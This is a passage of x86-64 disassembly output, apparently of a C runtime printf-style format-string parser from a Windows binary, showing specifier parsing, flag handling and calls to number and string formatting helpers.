  407312:	e8 19 ef ff ff       	call   0x406230
  407317:	90                   	nop
  407318:	48 83 c4 68          	add    $0x68,%rsp
  40731c:	5b                   	pop    %rbx
  40731d:	5e                   	pop    %rsi
  40731e:	5f                   	pop    %rdi
  40731f:	5d                   	pop    %rbp
  407320:	41 5c                	pop    %r12
  407322:	41 5d                	pop    %r13
  407324:	c3                   	ret
  407325:	48 89 d9             	mov    %rbx,%rcx
  407328:	e8 d3 f4 ff ff       	call   0x406800
  40732d:	eb 86                	jmp    0x4072b5
  40732f:	90                   	nop
  407330:	41 f6 c2 80          	test   $0x80,%r10b
  407334:	c7 43 0c ff ff ff ff 	movl   $0xffffffff,0xc(%rbx)
  40733b:	0f 84 eb fe ff ff    	je     0x40722c
  407341:	48 89 da             	mov    %rbx,%rdx
  407344:	b9 2d 00 00 00       	mov    $0x2d,%ecx
  407349:	e8 32 ec ff ff       	call   0x405f80
  40734e:	e9 f0 fe ff ff       	jmp    0x407243
  407353:	44 89 5b 0c          	mov    %r11d,0xc(%rbx)
  407357:	e9 c6 fe ff ff       	jmp    0x407222
  40735c:	48 89 da             	mov    %rbx,%rdx
  40735f:	b9 2b 00 00 00       	mov    $0x2b,%ecx
  407364:	e8 17 ec ff ff       	call   0x405f80
  407369:	e9 d5 fe ff ff       	jmp    0x407243
  40736e:	48 89 da             	mov    %rbx,%rdx
  407371:	b9 20 00 00 00       	mov    $0x20,%ecx
  407376:	e8 05 ec ff ff       	call   0x405f80
  40737b:	e9 c3 fe ff ff       	jmp    0x407243
  407380:	83 c7 01             	add    $0x1,%edi
  407383:	e9 d3 fc ff ff       	jmp    0x40705b
  407388:	dd d8                	fstp   %st(0)
  40738a:	49 89 d0             	mov    %rdx,%r8
  40738d:	48 8d 15 ec 64 15 00 	lea    0x1564ec(%rip),%rdx        # 0x55d880
  407394:	31 c9                	xor    %ecx,%ecx
  407396:	e8 f5 ed ff ff       	call   0x406190
  40739b:	e9 78 ff ff ff       	jmp    0x407318
  4073a0:	48 8d 15 dd 64 15 00 	lea    0x1564dd(%rip),%rdx        # 0x55d884
  4073a7:	49 89 d8             	mov    %rbx,%r8
  4073aa:	e8 e1 ed ff ff       	call   0x406190
  4073af:	e9 64 ff ff ff       	jmp    0x407318
  4073b4:	44 8b 4b 08          	mov    0x8(%rbx),%r9d
  4073b8:	85 d2                	test   %edx,%edx
  4073ba:	45 89 ca             	mov    %r9d,%r10d
  4073bd:	7e 1a                	jle    0x4073d9
  4073bf:	48 8d 75 01          	lea    0x1(%rbp),%rsi
  4073c3:	c6 44 24 40 2e       	movb   $0x2e,0x40(%rsp)
  4073c8:	c6 06 30             	movb   $0x30,(%rsi)
  4073cb:	48 83 c6 01          	add    $0x1,%rsi
  4073cf:	e9 98 fd ff ff       	jmp    0x40716c
  4073d4:	8b 53 10             	mov    0x10(%rbx),%edx
  4073d7:	eb df                	jmp    0x4073b8
  4073d9:	41 f7 c1 00 08 00 00 	test   $0x800,%r9d
  4073e0:	48 89 ee             	mov    %rbp,%rsi
  4073e3:	74 e3                	je     0x4073c8
  4073e5:	eb d8                	jmp    0x4073bf
  4073e7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  4073ee:	00 00 
  4073f0:	56                   	push   %rsi
  4073f1:	53                   	push   %rbx
  4073f2:	48 83 ec 68          	sub    $0x68,%rsp
  4073f6:	44 8b 42 10          	mov    0x10(%rdx),%r8d
  4073fa:	db 29                	fldt   (%rcx)
  4073fc:	48 89 d3             	mov    %rdx,%rbx
  4073ff:	45 85 c0             	test   %r8d,%r8d
  407402:	78 6c                	js     0x407470
  407404:	41 83 c0 01          	add    $0x1,%r8d
  407408:	db 7c 24 50          	fstpt  0x50(%rsp)
  40740c:	4c 8d 4c 24 4c       	lea    0x4c(%rsp),%r9
  407411:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
  407416:	b9 02 00 00 00       	mov    $0x2,%ecx
  40741b:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
  407420:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
  407425:	48 8b 44 24 58       	mov    0x58(%rsp),%rax
  40742a:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
  40742f:	48 8d 44 24 48       	lea    0x48(%rsp),%rax
  407434:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  407439:	e8 72 ea ff ff       	call   0x405eb0
  40743e:	44 8b 44 24 4c       	mov    0x4c(%rsp),%r8d
  407443:	48 89 c6             	mov    %rax,%rsi
  407446:	41 81 f8 00 80 ff ff 	cmp    $0xffff8000,%r8d
  40744d:	74 31                	je     0x407480
  40744f:	8b 4c 24 48          	mov    0x48(%rsp),%ecx
  407453:	49 89 d9             	mov    %rbx,%r9
  407456:	48 89 c2             	mov    %rax,%rdx
  407459:	e8 02 f8 ff ff       	call   0x406c60
  40745e:	48 89 f1             	mov    %rsi,%rcx
  407461:	e8 2a 25 00 00       	call   0x409990
  407466:	90                   	nop
  407467:	48 83 c4 68          	add    $0x68,%rsp
  40746b:	5b                   	pop    %rbx
  40746c:	5e                   	pop    %rsi
  40746d:	c3                   	ret
  40746e:	66 90                	xchg   %ax,%ax
  407470:	c7 42 10 06 00 00 00 	movl   $0x6,0x10(%rdx)
  407477:	41 b8 07 00 00 00    	mov    $0x7,%r8d
  40747d:	eb 89                	jmp    0x407408
  40747f:	90                   	nop
  407480:	8b 4c 24 48          	mov    0x48(%rsp),%ecx
  407484:	49 89 d8             	mov    %rbx,%r8
  407487:	48 89 c2             	mov    %rax,%rdx
  40748a:	e8 01 ed ff ff       	call   0x406190
  40748f:	48 89 f1             	mov    %rsi,%rcx
  407492:	e8 f9 24 00 00       	call   0x409990
  407497:	90                   	nop
  407498:	48 83 c4 68          	add    $0x68,%rsp
  40749c:	5b                   	pop    %rbx
  40749d:	5e                   	pop    %rsi
  40749e:	c3                   	ret
  40749f:	90                   	nop
  4074a0:	41 57                	push   %r15
  4074a2:	41 56                	push   %r14
  4074a4:	41 55                	push   %r13
  4074a6:	41 54                	push   %r12
  4074a8:	55                   	push   %rbp
  4074a9:	57                   	push   %rdi
  4074aa:	56                   	push   %rsi
  4074ab:	53                   	push   %rbx
  4074ac:	48 81 ec a8 00 00 00 	sub    $0xa8,%rsp
  4074b3:	4c 8b a4 24 10 01 00 	mov    0x110(%rsp),%r12
  4074ba:	00 
  4074bb:	41 89 ce             	mov    %ecx,%r14d
  4074be:	48 89 d6             	mov    %rdx,%rsi
  4074c1:	44 89 c7             	mov    %r8d,%edi
  4074c4:	4c 89 cb             	mov    %r9,%rbx
  4074c7:	41 81 e6 00 60 00 00 	and    $0x6000,%r14d
  4074ce:	e8 ed 34 00 00       	call   0x40a9c0
  4074d3:	48 8d 0d c3 63 15 00 	lea    0x1563c3(%rip),%rcx        # 0x55d89d
  4074da:	44 8b 38             	mov    (%rax),%r15d
  4074dd:	48 89 74 24 70       	mov    %rsi,0x70(%rsp)
  4074e2:	44 89 74 24 78       	mov    %r14d,0x78(%rsp)
  4074e7:	c7 44 24 7c ff ff ff 	movl   $0xffffffff,0x7c(%rsp)
  4074ee:	ff 
  4074ef:	c7 84 24 80 00 00 00 	movl   $0xffffffff,0x80(%rsp)
  4074f6:	ff ff ff ff 
  4074fa:	c7 84 24 84 00 00 00 	movl   $0xfffffffd,0x84(%rsp)
  407501:	fd ff ff ff 
  407505:	66 c7 84 24 88 00 00 	movw   $0x0,0x88(%rsp)
  40750c:	00 00 00 
  40750f:	c7 84 24 8c 00 00 00 	movl   $0x0,0x8c(%rsp)
  407516:	00 00 00 00 
  40751a:	66 c7 84 24 90 00 00 	movw   $0x0,0x90(%rsp)
  407521:	00 00 00 
  407524:	c7 84 24 94 00 00 00 	movl   $0x0,0x94(%rsp)
  40752b:	00 00 00 00 
  40752f:	89 bc 24 98 00 00 00 	mov    %edi,0x98(%rsp)
  407536:	e8 9d 34 00 00       	call   0x40a9d8
  40753b:	48 85 c0             	test   %rax,%rax
  40753e:	74 10                	je     0x407550
  407540:	0f be 10             	movsbl (%rax),%edx
  407543:	b8 02 00 00 00       	mov    $0x2,%eax
  407548:	83 ea 30             	sub    $0x30,%edx
  40754b:	83 fa 02             	cmp    $0x2,%edx
  40754e:	76 0d                	jbe    0x40755d
  407550:	e8 5b 26 00 00       	call   0x409bb0
  407555:	83 e0 01             	and    $0x1,%eax
  407558:	f7 d8                	neg    %eax
  40755a:	83 c0 03             	add    $0x3,%eax
  40755d:	89 84 24 9c 00 00 00 	mov    %eax,0x9c(%rsp)
  407564:	44 89 f0             	mov    %r14d,%eax
  407567:	80 cc 02             	or     $0x2,%ah
  40756a:	89 44 24 3c          	mov    %eax,0x3c(%rsp)
  40756e:	66 90                	xchg   %ax,%ax
  407570:	0f be 0b             	movsbl (%rbx),%ecx
  407573:	48 8d 73 01          	lea    0x1(%rbx),%rsi
  407577:	85 c9                	test   %ecx,%ecx
  407579:	0f 84 b2 00 00 00    	je     0x407631
  40757f:	83 f9 25             	cmp    $0x25,%ecx
  407582:	0f 85 c8 00 00 00    	jne    0x407650
  407588:	44 89 74 24 78       	mov    %r14d,0x78(%rsp)
  40758d:	c7 84 24 80 00 00 00 	movl   $0xffffffff,0x80(%rsp)
  407594:	ff ff ff ff 
  407598:	45 31 d2             	xor    %r10d,%r10d
  40759b:	c7 44 24 7c ff ff ff 	movl   $0xffffffff,0x7c(%rsp)
  4075a2:	ff 
  4075a3:	0f b6 43 01          	movzbl 0x1(%rbx),%eax
  4075a7:	45 31 ed             	xor    %r13d,%r13d
  4075aa:	48 89 f7             	mov    %rsi,%rdi
  4075ad:	4c 8d 5c 24 7c       	lea    0x7c(%rsp),%r11
  4075b2:	48 8d 2d fb 62 15 00 	lea    0x1562fb(%rip),%rbp        # 0x55d8b4
  4075b9:	84 c0                	test   %al,%al
  4075bb:	74 62                	je     0x40761f
  4075bd:	0f be c8             	movsbl %al,%ecx
  4075c0:	83 e8 20             	sub    $0x20,%eax
  4075c3:	48 8d 5f 01          	lea    0x1(%rdi),%rbx
  4075c7:	3c 5a                	cmp    $0x5a,%al
  4075c9:	0f 86 93 00 00 00    	jbe    0x407662
  4075cf:	83 f9 39             	cmp    $0x39,%ecx
  4075d2:	0f 8f 9a 07 00 00    	jg     0x407d72
  4075d8:	41 83 fd 03          	cmp    $0x3,%r13d
  4075dc:	0f 87 90 07 00 00    	ja     0x407d72
  4075e2:	83 f9 2f             	cmp    $0x2f,%ecx
  4075e5:	0f 8e 87 07 00 00    	jle    0x407d72
  4075eb:	45 85 ed             	test   %r13d,%r13d
  4075ee:	0f 85 4c 06 00 00    	jne    0x407c40
  4075f4:	41 bd 01 00 00 00    	mov    $0x1,%r13d
  4075fa:	4d 85 db             	test   %r11,%r11
  4075fd:	74 15                	je     0x407614
  4075ff:	41 8b 03             	mov    (%r11),%eax
  407602:	85 c0                	test   %eax,%eax
  407604:	0f 88 0a 07 00 00    	js     0x407d14
  40760a:	8d 04 80             	lea    (%rax,%rax,4),%eax
  40760d:	8d 44 41 d0          	lea    -0x30(%rcx,%rax,2),%eax
  407611:	41 89 03             	mov    %eax,(%r11)
  407614:	0f b6 47 01          	movzbl 0x1(%rdi),%eax
  407618:	48 89 df             	mov    %rbx,%rdi
  40761b:	84 c0                	test   %al,%al
  40761d:	75 9e                	jne    0x4075bd
  40761f:	48 89 fb             	mov    %rdi,%rbx
  407622:	0f be 0b             	movsbl (%rbx),%ecx
  407625:	48 8d 73 01          	lea    0x1(%rbx),%rsi
  407629:	85 c9                	test   %ecx,%ecx
  40762b:	0f 85 4e ff ff ff    	jne    0x40757f
  407631:	8b 84 24 94 00 00 00 	mov    0x94(%rsp),%eax
  407638:	48 81 c4 a8 00 00 00 	add    $0xa8,%rsp
  40763f:	5b                   	pop    %rbx
  407640:	5e                   	pop    %rsi
  407641:	5f                   	pop    %rdi
  407642:	5d                   	pop    %rbp
  407643:	41 5c                	pop    %r12
  407645:	41 5d                	pop    %r13
  407647:	41 5e                	pop    %r14
  407649:	41 5f                	pop    %r15
  40764b:	c3                   	ret
  40764c:	0f 1f 40 00          	nopl   0x0(%rax)
  407650:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
  407655:	48 89 f3             	mov    %rsi,%rbx
  407658:	e8 23 e9 ff ff       	call   0x405f80
  40765d:	e9 0e ff ff ff       	jmp    0x407570
  407662:	0f b6 c0             	movzbl %al,%eax
  407665:	48 63 44 85 00       	movslq 0x0(%rbp,%rax,4),%rax
  40766a:	48 01 e8             	add    %rbp,%rax
  40766d:	ff e0                	jmp    *%rax
  40766f:	90                   	nop
  407670:	41 83 ea 02          	sub    $0x2,%r10d
  407674:	4c 89 e0             	mov    %r12,%rax
  407677:	41 83 fa 01          	cmp    $0x1,%r10d
  40767b:	0f 86 d1 05 00 00    	jbe    0x407c52
  407681:	48 8b 30             	mov    (%rax),%rsi
  407684:	49 83 c4 08          	add    $0x8,%r12
  407688:	48 85 f6             	test   %rsi,%rsi
  40768b:	0f 84 a3 00 00 00    	je     0x407734
  407691:	48 89 f1             	mov    %rsi,%rcx
  407694:	e8 3f 32 00 00       	call   0x40a8d8
  407699:	89 c2                	mov    %eax,%edx
  40769b:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
  4076a0:	48 89 f1             	mov    %rsi,%rcx
  4076a3:	e8 28 ea ff ff       	call   0x4060d0
  4076a8:	e9 c3 fe ff ff       	jmp    0x407570
  4076ad:	0f 1f 00             	nopl   (%rax)
  4076b0:	45 85 ed             	test   %r13d,%r13d
  4076b3:	75 0b                	jne    0x4076c0
  4076b5:	44 39 74 24 78       	cmp    %r14d,0x78(%rsp)
  4076ba:	0f 84 9a 06 00 00    	je     0x407d5a
  4076c0:	49 8b 14 24          	mov    (%r12),%rdx
  4076c4:	49 8d 74 24 08       	lea    0x8(%r12),%rsi
  4076c9:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
  4076ce:	b9 78 00 00 00       	mov    $0x78,%ecx
  4076d3:	49 89 f4             	mov    %rsi,%r12
  4076d6:	48 89 54 24 60       	mov    %rdx,0x60(%rsp)
  4076db:	e8 20 ee ff ff       	call   0x406500
  4076e0:	e9 8b fe ff ff       	jmp    0x407570
  4076e5:	41 83 fa 04          	cmp    $0x4,%r10d
  4076e9:	49 8b 04 24          	mov    (%r12),%rax
  4076ed:	0f 84 ed 05 00 00    	je     0x407ce0
  4076f3:	41 83 fa 01          	cmp    $0x1,%r10d
  4076f7:	0f 84 26 06 00 00    	je     0x407d23
  4076fd:	41 83 fa 02          	cmp    $0x2,%r10d
  407701:	74 0a                	je     0x40770d
  407703:	41 83 fa 03          	cmp    $0x3,%r10d
  407707:	0f 84 b7 06 00 00    	je     0x407dc4
  40770d:	8b 94 24 94 00 00 00 	mov    0x94(%rsp),%edx
  407714:	49 83 c4 08          	add    $0x8,%r12
  407718:	89 10                	mov    %edx,(%rax)
  40771a:	e9 51 fe ff ff       	jmp    0x407570
  40771f:	90                   	nop
  407720:	44 89 f9             	mov    %r15d,%ecx
  407723:	e8 b8 32 00 00       	call   0x40a9e0
  407728:	48 85 c0             	test   %rax,%rax
  40772b:	48 89 c6             	mov    %rax,%rsi
  40772e:	0f 85 5d ff ff ff    	jne    0x407691
  407734:	ba 06 00 00 00       	mov    $0x6,%edx
  407739:	48 8d 35 56 61 15 00 	lea    0x156156(%rip),%rsi        # 0x55d896
  407740:	e9 56 ff ff ff       	jmp    0x40769b
  407745:	0f b6 47 01          	movzbl 0x1(%rdi),%eax
  407749:	41 ba 02 00 00 00    	mov    $0x2,%r10d
  40774f:	41 bd 04 00 00 00    	mov    $0x4,%r13d
  407755:	3c 6c                	cmp    $0x6c,%al
  407757:	0f 85 bb fe ff ff    	jne    0x407618
  40775d:	48 8d 5f 02          	lea    0x2(%rdi),%rbx
  407761:	0f b6 47 02          	movzbl 0x2(%rdi),%eax
  407765:	41 b2 03             	mov    $0x3,%r10b
  407768:	e9 ab fe ff ff       	jmp    0x407618
  40776d:	0f 1f 00             	nopl   (%rax)
  407770:	0f b6 47 01          	movzbl 0x1(%rdi),%eax
  407774:	41 ba 03 00 00 00    	mov    $0x3,%r10d
  40777a:	41 bd 04 00 00 00    	mov    $0x4,%r13d
  407780:	48 89 df             	mov    %rbx,%rdi
  407783:	e9 93 fe ff ff       	jmp    0x40761b
  407788:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40778f:	00 
  407790:	0f b6 47 01          	movzbl 0x1(%rdi),%eax
  407794:	41 ba 01 00 00 00    	mov    $0x1,%r10d
  40779a:	41 bd 04 00 00 00    	mov    $0x4,%r13d
  4077a0:	3c 68                	cmp    $0x68,%al
  4077a2:	0f 85 70 fe ff ff    	jne    0x407618
  4077a8:	48 8d 5f 02          	lea    0x2(%rdi),%rbx
  4077ac:	0f b6 47 02          	movzbl 0x2(%rdi),%eax
  4077b0:	41 b2 04             	mov    $0x4,%r10b
  4077b3:	e9 60 fe ff ff       	jmp    0x407618
  4077b8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  4077bf:	00 
  4077c0:	8b 44 24 78          	mov    0x78(%rsp),%eax
  4077c4:	49 8d 74 24 08       	lea    0x8(%r12),%rsi
  4077c9:	83 c8 20             	or     $0x20,%eax
  4077cc:	a8 04                	test   $0x4,%al
  4077ce:	89 44 24 78          	mov    %eax,0x78(%rsp)
  4077d2:	0f 84 f9 03 00 00    	je     0x407bd1
  4077d8:	49 8b 04 24          	mov    (%r12),%rax
  4077dc:	db 28                	fldt   (%rax)
  4077de:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
  4077e3:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
  4077e8:	49 89 f4             	mov    %rsi,%r12
  4077eb:	db 7c 24 40          	fstpt  0x40(%rsp)
  4077ef:	e8 2c f6 ff ff       	call   0x406e20
  4077f4:	e9 77 fd ff ff       	jmp    0x407570
  4077f9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  407800:	8b 44 24 78          	mov    0x78(%rsp),%eax
  407804:	49 8d 74 24 08       	lea    0x8(%r12),%rsi
  407809:	83 c8 20             	or     $0x20,%eax
  40780c:	a8 04                	test   $0x4,%al
  40780e:	89 44 24 78          	mov    %eax,0x78(%rsp)
  407812:	0f 84 d9 03 00 00    	je     0x407bf1
  407818:	49 8b 04 24          	mov    (%r12),%rax
  40781c:	db 28                	fldt   (%rax)
  40781e:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
  407823:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
  407828:	49 89 f4             	mov    %rsi,%r12
  40782b:	db 7c 24 40          	fstpt  0x40(%rsp)
  40782f:	e8 fc f4 ff ff       	call   0x406d30
  407834:	e9 37 fd ff ff       	jmp    0x407570
  407839:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  407840:	8b 44 24 78          	mov    0x78(%rsp),%eax
  407844:	49 8d 74 24 08       	lea    0x8(%r12),%rsi
  407849:	83 c8 20             	or     $0x20,%eax
  40784c:	a8 04                	test   $0x4,%al
  40784e:	89 44 24 78          	mov    %eax,0x78(%rsp)
  407852:	0f 84 e9 02 00 00    	je     0x407b41
  407858:	49 8b 04 24          	mov    (%r12),%rax
  40785c:	db 28                	fldt   (%rax)
  40785e:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
  407863:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
  407868:	49 89 f4             	mov    %rsi,%r12
  40786b:	db 7c 24 40          	fstpt  0x40(%rsp)
  40786f:	e8 7c fb ff ff       	call   0x4073f0
  407874:	e9 f7 fc ff ff       	jmp    0x407570
  407879:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  407880:	41 83 ea 02          	sub    $0x2,%r10d
  407884:	4c 89 e0             	mov    %r12,%rax
  407887:	c7 84 24 80 00 00 00 	movl   $0xffffffff,0x80(%rsp)
  40788e:	ff ff ff ff 
  407892:	41 83 fa 01          	cmp    $0x1,%r10d
  407896:	0f 86 bf 02 00 00    	jbe    0x407b5b
  40789c:	8b 00                	mov    (%rax),%eax
  40789e:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
  4078a3:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
  4078a8:	ba 01 00 00 00       	mov    $0x1,%edx
  4078ad:	49 83 c4 08          	add    $0x8,%r12
  4078b1:	88 44 24 60          	mov    %al,0x60(%rsp)
  4078b5:	e8 16 e8 ff ff       	call   0x4060d0
  4078ba:	e9 b1 fc ff ff       	jmp    0x407570
  4078bf:	90                   	nop
  4078c0:	81 4c 24 78 80 00 00 	orl    $0x80,0x78(%rsp)
  4078c7:	00 
  4078c8:	41 83 fa 03          	cmp    $0x3,%r10d
  4078cc:	0f 84 ea 03 00 00    	je     0x407cbc
  4078d2:	41 83 fa 02          	cmp    $0x2,%r10d
  4078d6:	0f 84 5a 04 00 00    	je     0x407d36
  4078dc:	49 63 04 24          	movslq (%r12),%rax
  4078e0:	41 83 fa 01          	cmp    $0x1,%r10d
  4078e4:	49 8d 54 24 08       	lea    0x8(%r12),%rdx
  4078e9:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
  4078ee:	0f 84 95 04 00 00    	je     0x407d89
  4078f4:	41 83 fa 04          	cmp    $0x4,%r10d
  4078f8:	49 89 d4             	mov    %rdx,%r12
  4078fb:	0f 84 d7 04 00 00    	je     0x407dd8
  407901:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
  407906:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
  40790b:	e8 20 e9 ff ff       	call   0x406230
  407910:	e9 5b fc ff ff       	jmp    0x407570
  407915:	41 83 fa 03          	cmp    $0x3,%r10d
  407919:	0f 84 af 03 00 00    	je     0x407cce
  40791f:	41 83 fa 02          	cmp    $0x2,%r10d
  407923:	0f 84 1f 04 00 00    	je     0x407d48
  407929:	49 8d 44 24 08       	lea    0x8(%r12),%rax
  40792e:	45 8b 24 24          	mov    (%r12),%r12d
  407932:	41 83 fa 01          	cmp    $0x1,%r10d
  407936:	4c 89 64 24 60       	mov    %r12,0x60(%rsp)
  40793b:	0f 84 5b 04 00 00    	je     0x407d9c
  407941:	41 83 fa 04          	cmp    $0x4,%r10d
  407945:	49 89 c4             	mov    %rax,%r12
  407948:	0f 84 9a 04 00 00    	je     0x407de8
  40794e:	83 f9 75             	cmp    $0x75,%ecx
  407951:	74 ae                	je     0x407901
  407953:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
  407958:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
  40795d:	e8 9e eb ff ff       	call   0x406500
  407962:	e9 09 fc ff ff       	jmp    0x407570
  407967:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  40796e:	00 00 
  407970:	8b 44 24 78          	mov    0x78(%rsp),%eax
  407974:	49 8d 74 24 08       	lea    0x8(%r12),%rsi
  407979:	83 c8 20             	or     $0x20,%eax
  40797c:	a8 04                	test   $0x4,%al
  40797e:	89 44 24 78          	mov    %eax,0x78(%rsp)
  407982:	0f 84 0e 02 00 00    	je     0x407b96
  407988:	49 8b 04 24          	mov    (%r12),%rax
  40798c:	db 28                	fldt   (%rax)
  40798e:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
  407993:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
  407998:	49 89 f4             	mov    %rsi,%r12
  40799b:	db 7c 24 40          	fstpt  0x40(%rsp)
  40799f:	e8 1c f6 ff ff       	call   0x406fc0
  4079a4:	e9 c7 fb ff ff       	jmp    0x407570
  4079a9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  4079b0:	83 4c 24 78 04       	orl    $0x4,0x78(%rsp)
  4079b5:	41 bd 04 00 00 00    	mov    $0x4,%r13d
  4079bb:	0f b6 47 01          	movzbl 0x1(%rdi),%eax
  4079bf:	48 89 df             	mov    %rbx,%rdi
  4079c2:	e9 54 fc ff ff       	jmp    0x40761b
  4079c7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  4079ce:	00 00 
  4079d0:	41 83 fd 01          	cmp    $0x1,%r13d
  4079d4:	0f 86 18 03 00 00    	jbe    0x407cf2
  4079da:	0f b6 47 01          	movzbl 0x1(%rdi),%eax
  4079de:	41 bd 04 00 00 00    	mov    $0x4,%r13d
  4079e4:	48 89 df             	mov    %rbx,%rdi
  4079e7:	e9 2f fc ff ff       	jmp    0x40761b
  4079ec:	0f 1f 40 00          	nopl   0x0(%rax)
  4079f0:	45 85 ed             	test   %r13d,%r13d
  4079f3:	0f 85 1b fc ff ff    	jne    0x407614
  4079f9:	81 4c 24 78 00 04 00 	orl    $0x400,0x78(%rsp)
  407a00:	00 
  407a01:	0f b6 47 01          	movzbl 0x1(%rdi),%eax
  407a05:	48 89 df             	mov    %rbx,%rdi
  407a08:	e9 0e fc ff ff       	jmp    0x40761b
  407a0d:	0f 1f 00             	nopl   (%rax)
  407a10:	45 85 ed             	test   %r13d,%r13d
  407a13:	0f 85 fb fb ff ff    	jne    0x407614
  407a19:	81 4c 24 78 00 01 00 	orl    $0x100,0x78(%rsp)
  407a20:	00 
  407a21:	0f b6 47 01          	movzbl 0x1(%rdi),%eax
  407a25:	48 89 df             	mov    %rbx,%rdi
  407a28:	e9 ee fb ff ff       	jmp    0x40761b
  407a2d:	0f 1f 00             	nopl   (%rax)
  407a30:	4d 85 db             	test   %r11,%r11
  407a33:	74 a5                	je     0x4079da
  407a35:	41 f7 c5 fd ff ff ff 	test   $0xfffffffd,%r13d
  407a3c:	0f 85 4e 02 00 00    	jne    0x407c90
  407a42:	41 8b 04 24          	mov    (%r12),%eax
  407a46:	49 8d 54 24 08       	lea    0x8(%r12),%rdx
  407a4b:	85 c0                	test   %eax,%eax
  407a4d:	41 89 03             	mov    %eax,(%r11)
  407a50:	0f 88 58 03 00 00    	js     0x407dae
  407a56:	0f b6 47 01          	movzbl 0x1(%rdi),%eax
  407a5a:	49 89 d4             	mov    %rdx,%r12
  407a5d:	45 31 db             	xor    %r11d,%r11d
  407a60:	48 89 df             	mov    %rbx,%rdi
  407a63:	e9 b3 fb ff ff       	jmp    0x40761b
  407a68:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  407a6f:	00 
  407a70:	45 85 ed             	test   %r13d,%r13d
  407a73:	0f 85 9b fb ff ff    	jne    0x407614
  407a79:	44 89 54 24 28       	mov    %r10d,0x28(%rsp)
  407a7e:	4c 89 5c 24 30       	mov    %r11,0x30(%rsp)
  407a83:	81 4c 24 78 00 10 00 	orl    $0x1000,0x78(%rsp)
  407a8a:	00 
  407a8b:	c7 44 24 5c 00 00 00 	movl   $0x0,0x5c(%rsp)
  407a92:	00 
  407a93:	e8 38 2f 00 00       	call   0x40a9d0
  407a98:	48 8b 50 08          	mov    0x8(%rax),%rdx
  407a9c:	4c 8d 4c 24 5c       	lea    0x5c(%rsp),%r9
  407aa1:	48 8d 4c 24 5a       	lea    0x5a(%rsp),%rcx
  407aa6:	41 b8 10 00 00 00    	mov    $0x10,%r8d
  407aac:	e8 6f 1c 00 00       	call   0x409720
  407ab1:	85 c0                	test   %eax,%eax
  407ab3:	44 8b 54 24 28       	mov    0x28(%rsp),%r10d
  407ab8:	4c 8b 5c 24 30       	mov    0x30(%rsp),%r11
  407abd:	7e 0d                	jle    0x407acc
  407abf:	0f b7 54 24 5a       	movzwl 0x5a(%rsp),%edx
  407ac4:	66 89 94 24 90 00 00 	mov    %dx,0x90(%rsp)
  407acb:	00 
  407acc:	89 84 24 8c 00 00 00 	mov    %eax,0x8c(%rsp)
  407ad3:	0f b6 47 01          	movzbl 0x1(%rdi),%eax
  407ad7:	e9 3c fb ff ff       	jmp    0x407618
  407adc:	0f 1f 40 00          	nopl   0x0(%rax)
  407ae0:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
  407ae5:	e8 96 e4 ff ff       	call   0x405f80
  407aea:	e9 81 fa ff ff       	jmp    0x407570
  407aef:	90                   	nop
  407af0:	45 85 ed             	test   %r13d,%r13d
  407af3:	0f 85 1b fb ff ff    	jne    0x407614
  407af9:	81 4c 24 78 00 08 00 	orl    $0x800,0x78(%rsp)
  407b00:	00 
  407b01:	0f b6 47 01          	movzbl 0x1(%rdi),%eax
  407b05:	48 89 df             	mov    %rbx,%rdi
  407b08:	e9 0e fb ff ff       	jmp    0x40761b
  407b0d:	0f 1f 00             	nopl   (%rax)
  407b10:	45 85 ed             	test   %r13d,%r13d
  407b13:	0f 85 fb fa ff ff    	jne    0x407614
  407b19:	83 4c 24 78 40       	orl    $0x40,0x78(%rsp)
  407b1e:	0f b6 47 01          	movzbl 0x1(%rdi),%eax
  407b22:	48 89 df             	mov    %rbx,%rdi
  407b25:	e9 f1 fa ff ff       	jmp    0x40761b
  407b2a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  407b30:	8b 44 24 78          	mov    0x78(%rsp),%eax
  407b34:	49 8d 74 24 08       	lea    0x8(%r12),%rsi
  407b39:	a8 04                	test   $0x4,%al
  407b3b:	0f 85 17 fd ff ff    	jne    0x407858
  407b41:	41 dd 04 24          	fldl   (%r12)
  407b45:	e9 14 fd ff ff       	jmp    0x40785e
  407b4a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  407b50:	c7 84 24 80 00 00 00 	movl   $0xffffffff,0x80(%rsp)
  407b57:	ff ff ff ff 
  407b5b:	41 8b 04 24          	mov    (%r12),%eax
  407b5f:	49 8d 74 24 08       	lea    0x8(%r12),%rsi
  407b64:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
  407b69:	48 8d 4c 24 5a       	lea    0x5a(%rsp),%rcx
